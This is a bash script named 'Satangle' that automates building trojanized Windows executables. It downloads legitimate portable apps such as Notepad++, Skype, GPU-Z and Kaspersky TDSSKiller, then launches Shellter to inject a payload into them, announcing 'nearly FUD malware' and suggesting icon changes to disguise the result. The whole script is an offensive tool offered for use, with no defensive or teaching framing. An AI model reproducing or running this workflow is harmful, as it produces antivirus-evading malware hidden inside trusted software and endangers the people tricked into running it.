#!/bin/bash
# Original source code by ANK1036.
echo -e "\e[0;49;31m                 ▄▄▄▓▓▓▓▓▓▄▄▄"
echo -e "\e[0;49;31m          ▀██▄▄▓▓▀▀▀   ░   ▀▀▀▓▓▄▄█▓▀"
echo -e "\e[0;49;31m           ▄███▄               ▄███▄"
echo -e "\e[0;49;31m         ▄▓▀ ▀▓██▄░          ▄██▓▀ ▀█▄"
echo -e "\e[0;49;31m        █▓░   ▀█▌▀▓█▄     ▄█▓▀▐█▀    ██"
echo -e "\e[0;49;31m       █▓▒     ▐█  ▀▓▓▓▄███▀░ ▓▌      ██"
echo -e "\e[0;49;31m      ▐█▌░      █▌  ▄█▓▀▓▓▄  ▐█       ▐█▌"
echo -e "\e[0;49;31m      ▓█        ▐█▄█▀ ▒   ▀█▄█▌        ▓█"
echo -e "\e[0;49;31m      ▓█      ▄▄███   ░     █▓▓▄▄     ░▓█"
echo -e "\e[0;49;31m      ▓█  ▄▄▓▓▀▀  ▓█       █▓  ▀▀▓▓▄▄░▒▓█"
echo -e "\e[0;49;31m      ▓████▀░░▄▄▄▄▄▓█▓▀▀▀▓█▓▄▄▄▄▄ ░▀██▓██"
echo -e "\e[0;49;31m  ▄▄██▀██▀▀▀▀▀▀     █▓░ ░▓█    ▀▀▀▀▀▀▀██▀██▄▄"
echo -e "\e[0;49;31m▀▀▀     █▓░         ▐▓░ ░▓▌          █▓     ▀▀▀"
echo -e "\e[0;49;31m         █▓░         █▌ ▐█          █▓"
echo -e "\e[0;49;31m          ▀▓▄        ▐█░█▌        ▄▓▀"
echo -e "\e[0;49;31m            ▀██▄▄     █▒█     ▄▄█▓▀"
echo -e "\e[0;49;31m               ▀▀▓▓▓▄▄█▓█▄▄▓▓▓▀▀"
echo -e "\e[0;49;31m                    ▀▀███▀▀"
echo -e "\e[0;49;31m                      ▐█▌"
echo -e "\e[0;49;31m                       ▓"
echo -e "\e[0;49;31m                       ▒"
echo -e "\e[0;49;31m                       ░"
echo ''
echo ' @@@@@@  @@@@@@  @@@@@@@  @@@@@@  @@@  @@@  @@@@@@@  @@@      @@@@@@@@'
echo '!@@     @@!  @@@   @!!   @@!  @@@ @@!@!@@@ !@@       @@!      @@!'
echo ' !@@!!  @!@!@!@!   @!!   @!@!@!@! @!@@!!@! !@! @!@!@ @!!      @!!!:!'
echo '    !:! !!:  !!!   !!:   !!:  !!! !!:  !!! :!!   !!: !!:      !!:'
echo '::.: :   :   : :    :     :   : : ::    :   :: :: :  : ::.: : : :: ::'
echo ''
echo ''
echo "This script requires Shellter and Wine, make sure to have them downloaded first!"
echo "Are you ready to continue? Y\N"
read -p "Satangle>> " installer_prompt
if [[ $installer_prompt = "Y" ]]; then
  echo "Next we'll need a PE file to inject into. (You can Google the names if you'd like to know what you're injecting into)"
  echo "Choose one from below..."
  echo "1 = IsoToxin (Tested and working)"
  echo "2 = Kaspersky TDSSKiller Portable (Kek to the devs) (Tested and working)"
  echo "3 = Don't Panic! Portable (For the lulz) (Tested and working)"
  echo "4 = GPU-Z Portable (Tested and working)"
  echo "5 = PeerBlock (Tested and working)"
  echo "6 = SpybotPortable (Tested and working)"
  echo "7 = Skype (Tested and working)"
  echo "8 = Notepad++ (Tested and working)"
  echo "More coming soon..."
  read -p "Satangle>> " PE_choice
  if [[ $PE_choice = "1" ]]; then
    echo "Downloading file. Name will be IsoToxinPortable.exe"
    wget -q "https://downloads.sourceforge.net/project/portableapps/Isotoxin%20Portable/IsotoxinPortable_0.4.503.paf.exe" -O "IsoToxinPortable.exe"
    echo "Done."
    echo "Remember the name of the executable, it'll be important for the next step. (Sleeping script for 5 seconds)"
    sleep 5
    echo "When Shellter opens, select Automatic, and enter the executable name. Follow the instructions from then on. (Sleeping for another 3 seconds...)"
    sleep 3
    shellter
    echo "Congratulations, you have a nearly FUD malware!"
    echo "Have fun! (Exiting...)"
  fi
  if [[ $PE_choice = "2" ]]; then
    echo "Downloading file. Name will be Kaspersky_TDSSKiller.exe"
    wget -q "https://downloads.sourceforge.net/project/portableapps/Kaspersky%20TDSSKiller%20Portable/KasperskyTDSSKillerPortable_3.1.0.12_English_online.paf.exe" -O "Kaspersky_TDSSKiller.exe"
    echo "Done."
    echo "Remember the name of the executable, it'll be important for the next step. (Sleeping script for 5 seconds)"
    sleep 5
    echo "When Shellter opens, select Automatic, and enter the executable name. Follow the instructions from then on. (Sleeping for another 3 seconds...)"
    sleep 3
    shellter
    echo "Congratulations, you have a nearly FUD malware!"
    echo "Have fun! (Exiting...)"
  fi
  if [[ $PE_choice = "3" ]]; then
    echo "Downloading file. Name will be DontPanic.exe"
    wget -q "https://downloads.sourceforge.net/project/portableapps/Dont%20Panic%20Portable/DontPanicPortable_3.1.0.paf.exe" -O "DontPanic.exe"
    echo "Done."
    echo "Remember the name of the executable, it'll be important for the next step. (Sleeping script for 5 seconds)"
    sleep 5
    echo "When Shellter opens, select Automatic, and enter the executable name. Follow the instructions from then on. (Sleeping for another 3 seconds...)"
    sleep 3
    shellter
    echo "Congratulations, you have a nearly FUD malware!"
    echo "Have fun! (Exiting...)"
  fi
  if [[ $PE_choice = "4" ]]; then
    echo "Downloading file. Name will be GPU-Z_Portable.exe"
    wget -q "http://download3.portableapps.com/portableapps/gpu-zportable/GPU-ZPortable_1.17.0.paf.exe" -O "GPU-Z_Portable.exe"
    echo "Done."
    echo "Remember the name of the executable, it'll be important for the next step. (Sleeping script for 5 seconds)"
    sleep 5
    echo "When Shellter opens, select Automatic, and enter the executable name. Follow the instructions from then on. (Sleeping for another 3 seconds...)"
    sleep 3
    shellter
    echo "Congratulations, you have a nearly FUD malware!"
    echo "Have fun! (Exiting...)"
  fi
  if [[ $PE_choice = "5" ]]; then
    echo "Downloading file. Name will be PeerBlock.exe"
    wget -q "http://downloads.sourceforge.net/portableapps/PeerBlockPortable_1.2_English.paf.exe" -O "PeerBlock.exe"
    echo "Done."
    echo "Remember the name of the executable, it'll be important for the next step. (Sleeping script for 5 seconds)"
    sleep 5
    echo "When Shellter opens, select Automatic, and enter the executable name. Follow the instructions from then on. (Sleeping for another 3 seconds...)"
    shellter
    echo "Congratulations, you have a nearly FUD malware!"
    echo "Have fun! (Exiting...)"
  fi
    if [[ $PE_choice = "6" ]]; then
    echo "Downloading file (this is a large one). Name will be Spybot2.5.exe"
    wget -q "http://download3.portableapps.com/portableapps/spybotportable/SpybotPortable_2.5.paf.exe" -O "Spybot2.5.exe"
    echo "Done."
    echo "Remember the name of the executable, it'll be important for the next step. (Sleeping script for 5 seconds)"
    sleep 5
    echo "When Shellter opens, select Automatic, and enter the executable name. Follow the instructions from then on. (Sleeping for another 3 seconds...)"
    shellter
    echo "Congratulations, you have a nearly FUD malware!"
    echo "Have fun! (Exiting...)"
  fi
    if [[ $PE_choice = "7" ]]; then
    echo "Downloading file. Name will be Skype.exe"
    wget -q "http://portableapps.com/redirect/?a=SkypePortable&t=http%3A%2F%2Fdownloads.portableapps.com%2Fportableapps%2Fskypeportable%2FSkypePortable_7.32.0.104_online.paf.exe" -O "Skype.exe"
    echo "Done."
    echo "Remember the name of the executable, it'll be important for the next step. (Sleeping script for 5 seconds)"
    sleep 5
    echo "When Shellter opens, select Automatic, and enter the executable name. Follow the instructions from then on. (Sleeping for another 3 seconds...)"
    shellter
    echo "Congratulations, you have a nearly FUD malware!"
    echo "Have fun! (Exiting...)"
  fi
    if [[ $PE_choice = "8" ]]; then
    echo "Downloading file. Name will be Notepad++.exe"
    wget -q "http://sourceforge.net/projects/portableapps/files/Notepad%2B%2B%20Portable/NotepadPlusPlusPortable_7.3.3.paf.exe" -O "Notepad++.exe"
    echo "Done."
    echo "Remember the name of the executable, it'll be important for the next step. (Sleeping script for 5 seconds)"
    sleep 5
    echo "When Shellter opens, select Automatic, and enter the executable name. Follow the instructions from then on. (Sleeping for another 3 seconds...)"
    shellter
    echo "Congratulations, you have a nearly FUD malware!"
    echo "Have fun! (Exiting...)"
  fi
  echo "P.S ~ If you need to change the icon, you can download Resource Hacker, it works fine in Wine."
fi
if [[ $installer_prompt = "N" ]]; then
  echo "Exiting..."
fi